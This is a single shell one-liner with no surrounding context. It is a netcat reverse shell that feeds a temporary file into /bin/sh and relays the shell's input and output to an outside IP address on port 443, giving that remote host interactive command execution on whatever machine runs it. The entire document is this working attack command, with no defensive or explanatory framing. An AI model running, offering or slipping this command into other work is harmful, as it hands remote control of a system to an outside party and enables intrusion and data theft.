tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 51.79.241.133 443 1> /tmp/1
